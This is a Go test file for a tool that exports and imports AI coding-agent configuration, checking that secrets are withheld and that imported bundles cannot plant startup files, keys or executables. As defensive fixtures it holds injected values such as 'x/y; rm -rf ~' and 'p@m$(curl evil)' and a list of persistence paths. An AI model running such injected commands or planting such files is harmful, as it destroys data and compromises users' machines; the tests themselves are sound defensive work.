package cmd

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func declinedHas(d []DeclinedAsset, path, category string) bool {
	for _, x := range d {
		if x.Path == path && x.Category == category {
			return true
		}
	}
	return false
}

// Every agent tool's user-level setup is carried, not only Claude's and
// Codex's, and settings that can hold tokens are redacted without
// --include-secrets.
func TestCollectSetupAssets_CarriesEveryToolsUserSetup(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".gemini", "GEMINI.md"), "gemini rules\n")
	mustWriteFile(t, filepath.Join(home, ".gemini", "settings.json"), `{"apiKey":"x"}`)
	mustWriteFile(t, filepath.Join(home, ".gemini", "commands", "ship.toml"), "prompt = 'ship'\n")
	mustWriteFile(t, filepath.Join(home, ".codex", "AGENTS.md"), "codex rules\n")
	mustWriteFile(t, filepath.Join(home, ".codex", "prompts", "review.md"), "review\n")
	mustWriteFile(t, filepath.Join(home, ".copilot", "config.json"), `{"token":"x"}`)
	mustWriteFile(t, filepath.Join(home, ".copilot", "agents", "a.md"), "agent\n")
	mustWriteFile(t, filepath.Join(home, ".cursor", "mcp.json"), `{"mcpServers":{}}`)
	mustWriteFile(t, filepath.Join(home, ".codeium", "windsurf", "mcp_config.json"), `{"mcpServers":{}}`)
	mustWriteFile(t, filepath.Join(home, ".claude", "output-styles", "terse.md"), "terse\n")

	assets, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		root, path string
		redacted   bool
	}{
		{setupAssetRootProviderGemini, "GEMINI.md", false},
		{setupAssetRootProviderGemini, "settings.json", true},
		{setupAssetRootProviderGemini, "commands/ship.toml", false},
		{setupAssetRootProviderCodex, "AGENTS.md", false},
		{setupAssetRootProviderCodex, "prompts/review.md", false},
		{setupAssetRootProviderCopilotCLI, "config.json", true},
		{setupAssetRootProviderCopilotCLI, "agents/a.md", false},
		{setupAssetRootProviderCursor, "mcp.json", true},
		{setupAssetRootProviderWindsurf, "mcp_config.json", true},
		{setupAssetRootProviderClaude, "output-styles/terse.md", false},
	} {
		a := findAsset(assets.ProviderFiles, c.root, c.path)
		if a == nil {
			t.Errorf("%s/%s not carried", c.root, c.path)
			continue
		}
		// Sensitive JSON travels with secret values blanked, not whole-file
		// redacted; it must not carry the planted token "x".
		if !a.ContentPresent {
			t.Errorf("%s/%s carried without content", c.root, c.path)
		}
		if c.redacted && (bytes.Contains(a.Content, []byte(`"x"`)) || !a.Sensitive) {
			t.Errorf("%s/%s carried a secret value: %s", c.root, c.path, a.Content)
		}
	}
}

// Login tokens stay behind even with --include-secrets, from any directory
// that is walked.
func TestCollectSetupAssets_NeverCarriesCredentialFiles(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".gemini", "commands", "oauth_creds.json"), `{"refresh_token":"x"}`)
	mustWriteFile(t, filepath.Join(home, ".claude", "hooks", ".credentials.json"), `{"t":"x"}`)
	mustWriteFile(t, filepath.Join(home, ".claude", "hooks", "guard.sh"), "#!/bin/sh\n")

	assets, _, err := collectSetupAssets(setupAssetOptions{IncludeSecrets: true})
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range assets.ProviderFiles {
		switch filepath.Base(a.LogicalPath) {
		case "oauth_creds.json", ".credentials.json":
			t.Errorf("credential file carried: %s/%s", a.LogicalRoot, a.LogicalPath)
		}
	}
	if findAsset(assets.ProviderFiles, setupAssetRootProviderClaude, "hooks/guard.sh") == nil {
		t.Error("hooks/guard.sh not carried")
	}
}

// From ~/.claude.json only the MCP servers travel. The signed-in account and
// per-project state stay, and import merges instead of replacing the file.
func TestClaudeUserMCPServersExportAndMerge(t *testing.T) {
	src := t.TempDir()
	setTestHomeDir(t, src)
	mustWriteFile(t, filepath.Join(src, ".claude.json"),
		`{"oauthAccount":{"email":"a@b"},"projects":{"/x":{}},"mcpServers":{"gh":{"command":"gh-mcp"}}}`)

	assets, _, err := collectSetupAssets(setupAssetOptions{IncludeSecrets: true})
	if err != nil {
		t.Fatal(err)
	}
	a := findAsset(assets.ProviderFiles, setupAssetRootProviderHome, ".claude.json")
	if a == nil || !a.ContentPresent {
		t.Fatalf("~/.claude.json MCP servers not carried: %+v", a)
	}
	if bytes.Contains(a.Content, []byte("oauthAccount")) || bytes.Contains(a.Content, []byte("projects")) {
		t.Fatalf("carried more than mcpServers: %s", a.Content)
	}

	dst := t.TempDir()
	mustWriteFile(t, filepath.Join(dst, ".claude.json"), `{"oauthAccount":{"email":"other@b"},"mcpServers":{}}`)
	applied, warnings, err := applyProviderAssetsToSystem(dst, []SetupAsset{*a})
	if err != nil || applied != 1 {
		t.Fatalf("apply = %d, %v, %v", applied, warnings, err)
	}
	var got map[string]json.RawMessage
	data, _ := os.ReadFile(filepath.Join(dst, ".claude.json"))
	if err := json.Unmarshal(data, &got); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got["oauthAccount"]), "other@b") {
		t.Errorf("the destination's account was replaced: %s", data)
	}
	if !strings.Contains(string(got["mcpServers"]), "gh-mcp") {
		t.Errorf("mcpServers not merged: %s", data)
	}

	redacted, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	// Without --include-secrets the servers travel; secret values in them do not.
	if r := findAsset(redacted.ProviderFiles, setupAssetRootProviderHome, ".claude.json"); r == nil || !r.ContentPresent ||
		!bytes.Contains(r.Content, []byte("gh-mcp")) {
		t.Errorf("without --include-secrets the MCP servers must still travel: %+v", r)
	}
}

func TestCollectSetupAssets_MemoryOnlyWhenAsked(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".claude", "projects", "-home-x-proj", "memory", "MEMORY.md"), "- fact\n")
	mustWriteFile(t, filepath.Join(home, ".claude", "projects", "-home-x-proj", "session.jsonl"), "{}\n")
	mustWriteFile(t, filepath.Join(home, ".codex", "memories", "m.md"), "memory\n")

	without, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range without.ProviderFiles {
		if strings.Contains(a.LogicalPath, "memor") {
			t.Fatalf("memory carried without --include-memory: %s", a.LogicalPath)
		}
	}
	with, _, err := collectSetupAssets(setupAssetOptions{IncludeMemory: true})
	if err != nil {
		t.Fatal(err)
	}
	if findAsset(with.ProviderFiles, setupAssetRootProviderClaude, "projects/-home-x-proj/memory/MEMORY.md") == nil {
		t.Error("Claude project memory not carried")
	}
	if findAsset(with.ProviderFiles, setupAssetRootProviderCodex, "memories/m.md") == nil {
		t.Error("Codex memories not carried")
	}
	if findAsset(with.ProviderFiles, setupAssetRootProviderClaude, "projects/-home-x-proj/session.jsonl") != nil {
		t.Error("a session transcript was carried as memory")
	}
}

// A user-level CLAUDE.md that imports or names other files arrives with
// them, followed through the files they name in turn.
func TestCollectSetupAssets_FollowsUserInstructionReferences(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".claude", "CLAUDE.md"),
		"@~/Projects/AGENTS.md\nSee `rules/style.md` and `/etc/hosts` and `rules/gone.md`.\n")
	mustWriteFile(t, filepath.Join(home, "Projects", "AGENTS.md"), "Read [the checklist](docs/check.md).\n")
	mustWriteFile(t, filepath.Join(home, "Projects", "docs", "check.md"), "check\n")
	mustWriteFile(t, filepath.Join(home, ".claude", "rules", "style.md"), "style\n")

	assets, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"Projects/AGENTS.md", "Projects/docs/check.md", ".claude/rules/style.md"} {
		a := findAsset(assets.ProviderFiles, setupAssetRootProviderHome, want)
		if a == nil || !a.ContentPresent {
			t.Errorf("~/%s not carried", want)
		}
	}
	if !declinedHas(assets.Declined, "/etc/hosts", DeclinedByPolicy) {
		t.Errorf("/etc/hosts not declined by policy: %v", assets.Declined)
	}
	if !declinedHas(assets.Declined, "rules/gone.md", DeclinedAbsent) {
		t.Errorf("rules/gone.md not recorded as absent: %v", assets.Declined)
	}
}

// The scripts a settings.json runs are carried, wherever under home they live.
func TestCollectSetupAssets_CarriesScriptsSettingsRun(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	settings := map[string]any{
		"hooks": map[string]any{"PreToolUse": []any{map[string]any{
			"hooks": []any{map[string]any{"type": "command", "command": "bash ~/bin/guard.sh --strict"}},
		}}},
		"statusLine": map[string]any{"type": "command", "command": filepath.Join(home, "scripts", "status.sh")},
	}
	data, _ := json.Marshal(settings)
	mustWriteFile(t, filepath.Join(home, ".claude", "settings.json"), string(data))
	mustWriteFile(t, filepath.Join(home, "bin", "guard.sh"), "#!/bin/sh\n")
	mustWriteFile(t, filepath.Join(home, "scripts", "status.sh"), "#!/bin/sh\n")

	// Without --include-secrets: settings.json is redacted, and the scripts
	// it runs must still be found.
	assets, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"bin/guard.sh", "scripts/status.sh"} {
		if findAsset(assets.ProviderFiles, setupAssetRootProviderHome, want) == nil {
			t.Errorf("~/%s not carried", want)
		}
	}
}

// Project scope: every tool's instruction files and rule directories are
// carried, with what they name; each tool's repository settings are listed.
func TestCollectSetupAssets_ProjectInstructionsClosureAndRepoSettings(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	project := t.TempDir()
	mustWriteFile(t, filepath.Join(project, "AGENTS.md"), "Follow `docs/a.md` and everything in `checklists/`.\n")
	mustWriteFile(t, filepath.Join(project, "docs", "a.md"), "Then [b](b.md).\n")
	mustWriteFile(t, filepath.Join(project, "docs", "b.md"), "b\n")
	mustWriteFile(t, filepath.Join(project, "checklists", "release.md"), "release\n")
	mustWriteFile(t, filepath.Join(project, "checklists", "review.md"), "review\n")
	mustWriteFile(t, filepath.Join(project, "GEMINI.md"), "gemini\n")
	mustWriteFile(t, filepath.Join(project, ".github", "instructions", "go.instructions.md"), "go\n")
	mustWriteFile(t, filepath.Join(project, ".cursor", "rules", "x.mdc"), "x\n")
	mustWriteFile(t, filepath.Join(project, "CONVENTIONS.md"), "conv\n")
	mustWriteFile(t, filepath.Join(project, ".mcp.json"), `{"mcpServers":{}}`)
	mustWriteFile(t, filepath.Join(project, ".gemini", "settings.json"), `{}`)

	assets, _, err := collectSetupAssets(setupAssetOptions{ProjectDir: project})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"AGENTS.md", "docs/a.md", "docs/b.md", "checklists/release.md",
		"checklists/review.md", "GEMINI.md", ".github/instructions/go.instructions.md",
		".cursor/rules/x.mdc", "CONVENTIONS.md"} {
		if findAsset(assets.ProjectFiles, setupAssetRootProject, want) == nil {
			t.Errorf("%s not carried", want)
		}
	}
	for _, repo := range []string{".mcp.json", ".gemini/settings.json"} {
		if findAsset(assets.ProjectFiles, setupAssetRootProject, repo) != nil {
			t.Errorf("%s carried; repository settings are listed only", repo)
		}
		if !declinedHas(assets.Declined, repo, DeclinedRepoScope) {
			t.Errorf("%s not listed as repository settings", repo)
		}
	}
	seen := map[string]int{}
	for _, a := range assets.ProjectFiles {
		seen[a.LogicalPath]++
	}
	for p, n := range seen {
		if n > 1 {
			t.Errorf("%s carried %d times", p, n)
		}
	}
}

func TestPluginInventoryAndInstallCommands(t *testing.T) {
	home := t.TempDir()
	mustWriteFile(t, filepath.Join(home, ".claude", "plugins", "known_marketplaces.json"),
		`{"official":{"source":{"source":"github","repo":"anthropics/claude-plugins-official"}},"mine":{"source":{"source":"directory","path":"/home/x/mkt"}}}`)
	mustWriteFile(t, filepath.Join(home, ".claude", "plugins", "installed_plugins.json"),
		`{"version":2,"plugins":{"superpowers@official":[{"scope":"user","version":"5.1.0","installPath":"/home/x/.claude/plugins/cache/s"}]}}`)
	inv, err := collectClaudePluginInventory(home)
	if err != nil || inv == nil {
		t.Fatalf("inventory = %+v, %v", inv, err)
	}
	var out bytes.Buffer
	printPluginInstallCommands(&out, inv)
	got := out.String()
	for _, want := range []string{
		"claude plugin marketplace add anthropics/claude-plugins-official",
		"claude plugin install superpowers@official",
		`# "mine" is a local directory`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("output lacks %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "/home/x/.claude/plugins/cache") {
		t.Error("a machine-local cache path leaked into the commands")
	}

	if empty, err := collectClaudePluginInventory(t.TempDir()); err != nil || empty != nil {
		t.Errorf("no plugins dir: got %+v, %v; want nil, nil", empty, err)
	}
}

// An instruction that says "put the token in `.env`" must not carry .env,
// at project scope or from a user-level file.
func TestCollectSetupAssets_NeverFollowsIntoSecretFiles(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	project := t.TempDir()
	mustWriteFile(t, filepath.Join(project, "AGENTS.md"), "Put the token in `.env`; see `config/`.\n")
	mustWriteFile(t, filepath.Join(project, ".env"), "TOKEN=s3cret\n")
	mustWriteFile(t, filepath.Join(project, "config", "app.toml"), "a = 1\n")
	mustWriteFile(t, filepath.Join(project, "config", "tls.key"), "KEY\n")
	mustWriteFile(t, filepath.Join(home, ".claude", "CLAUDE.md"), "Deploy keys: `~/.ssh/id_ed25519`, `~/.netrc`.\n")
	mustWriteFile(t, filepath.Join(home, ".ssh", "id_ed25519"), "PRIVATE\n")
	mustWriteFile(t, filepath.Join(home, ".netrc"), "machine x password y\n")

	assets, _, err := collectSetupAssets(setupAssetOptions{ProjectDir: project, IncludeSecrets: true})
	if err != nil {
		t.Fatal(err)
	}
	all := append(append([]SetupAsset{}, assets.ProjectFiles...), assets.ProviderFiles...)
	for _, a := range all {
		if bytes.Contains(a.Content, []byte("s3cret")) || bytes.Contains(a.Content, []byte("PRIVATE")) ||
			bytes.Contains(a.Content, []byte("password y")) || a.LogicalPath == "config/tls.key" {
			t.Errorf("secret carried: %s/%s", a.LogicalRoot, a.LogicalPath)
		}
	}
	if findAsset(assets.ProjectFiles, setupAssetRootProject, "config/app.toml") == nil {
		t.Error("config/app.toml (a named directory's plain file) not carried")
	}
	if !declinedHas(assets.Declined, ".env", DeclinedByPolicy) {
		t.Errorf(".env refusal not recorded: %v", assets.Declined)
	}
}

// The home root is an allowlist: ~/.claude.json, merged, and prose. A bundle
// from someone else must not plant startup files, keys, PATH entries or
// anything executable, whatever the spelling.
func TestApplyHomeRootIsAnAllowlist(t *testing.T) {
	home := t.TempDir()
	var assets []SetupAsset
	refused := []string{".bashrc", ".BASHRC", " .bashrc", " .claude.json", "./.claude.json", "docs//x.md", ".zshrc", ".ssh/authorized_keys", ".SSH/authorized_keys",
		".netrc", ".config/autostart/x.desktop", "Library/LaunchAgents/x.plist", ".hidden-at-root",
		"bin/guard.sh", ".local/bin/git", "notes/run.sh"}
	for _, p := range refused {
		assets = append(assets, SetupAsset{LogicalRoot: setupAssetRootProviderHome, LogicalPath: p,
			ContentPresent: true, Content: []byte("payload")})
	}
	assets = append(assets, SetupAsset{LogicalRoot: setupAssetRootProviderHome, LogicalPath: "docs/howto.md",
		ContentPresent: true, Content: []byte("how\n")})
	applied, warnings, err := applyProviderAssetsToSystem(home, assets)
	if err != nil {
		t.Fatal(err)
	}
	if applied != 1 {
		t.Errorf("applied = %d, want 1 (docs/howto.md); warnings: %v", applied, warnings)
	}
	for _, p := range refused {
		if _, err := os.Lstat(filepath.Join(home, strings.TrimSpace(p))); !os.IsNotExist(err) {
			t.Errorf("%q was written", p)
		}
	}
	info, err := os.Stat(filepath.Join(home, "docs", "howto.md"))
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm()&0o111 != 0 {
		t.Errorf("prose written executable: %v", info.Mode())
	}
}

// The keys merged into ~/.claude.json are fixed in code: a bundle that asks
// to merge oauthAccount does not get to replace the account.
func TestApplyClaudeJSONIgnoresBundleMergeKeys(t *testing.T) {
	home := t.TempDir()
	mustWriteFile(t, filepath.Join(home, ".claude.json"), `{"oauthAccount":{"email":"mine@x"}}`)
	_, warnings, err := applyProviderAssetsToSystem(home, []SetupAsset{{
		LogicalRoot: setupAssetRootProviderHome, LogicalPath: ".claude.json", ContentPresent: true,
		Content:   []byte(`{"oauthAccount":{"email":"attacker@x"},"mcpServers":{"a":{"command":"x"}}}`),
		MergeKeys: []string{"oauthAccount", "mcpServers"},
	}})
	if err != nil {
		t.Fatal(err, warnings)
	}
	data, _ := os.ReadFile(filepath.Join(home, ".claude.json"))
	if !bytes.Contains(data, []byte("mine@x")) || bytes.Contains(data, []byte("attacker@x")) {
		t.Errorf("account replaced from the bundle: %s", data)
	}
	if !bytes.Contains(data, []byte(`"mcpServers"`)) {
		t.Errorf("mcpServers not merged: %s", data)
	}
}

// A reference named like a note that is a symlink to a credential file is
// refused by its resolved path.
func TestHomeReferenceRefusesSymlinkToSecret(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".netrc"), "machine x password y\n")
	if err := os.Symlink(filepath.Join(home, ".netrc"), filepath.Join(home, "notes.md")); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	mustWriteFile(t, filepath.Join(home, ".claude", "CLAUDE.md"), "See `~/notes.md`.\n")
	assets, _, err := collectSetupAssets(setupAssetOptions{IncludeSecrets: true})
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range assets.ProviderFiles {
		if bytes.Contains(a.Content, []byte("password y")) {
			t.Fatalf("credential carried through a symlink as %s", a.LogicalPath)
		}
	}
}

// Without --include-secrets a referenced script is redacted; referenced
// prose is carried.
func TestHomeReferencedNonProseIsSensitive(t *testing.T) {
	home := t.TempDir()
	setTestHomeDir(t, home)
	mustWriteFile(t, filepath.Join(home, ".claude", "CLAUDE.md"), "Run `~/bin/deploy.sh`, read `~/docs/howto.md`.\n")
	mustWriteFile(t, filepath.Join(home, "bin", "deploy.sh"), "TOKEN=abc ./deploy\n")
	mustWriteFile(t, filepath.Join(home, "docs", "howto.md"), "how\n")
	assets, _, err := collectSetupAssets(setupAssetOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if a := findAsset(assets.ProviderFiles, setupAssetRootProviderHome, "bin/deploy.sh"); a == nil || !a.Redacted {
		t.Errorf("bin/deploy.sh not redacted: %+v", a)
	}
	if a := findAsset(assets.ProviderFiles, setupAssetRootProviderHome, "docs/howto.md"); a == nil || !a.ContentPresent {
		t.Errorf("docs/howto.md not carried: %+v", a)
	}
}

// Values from a bundle printed as shell commands must not carry shell syntax.
func TestPluginInstallCommandsRefuseShellSyntax(t *testing.T) {
	var out bytes.Buffer
	printPluginInstallCommands(&out, &PluginInventory{
		Marketplaces: []PluginMarketplace{{Name: "m", Source: "x/y; rm -rf ~", Kind: "github"}},
		Plugins:      []InstalledPlugin{{ID: "p@m$(curl evil)"}, {ID: "ok@m"}},
	})
	for _, line := range strings.Split(out.String(), "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "claude ") && strings.ContainsAny(trimmed, ";$()`|&") {
			t.Errorf("unsafe command printed: %s", line)
		}
	}
	if !strings.Contains(out.String(), "claude plugin install ok@m") {
		t.Errorf("valid plugin not printed:\n%s", out.String())
	}
}
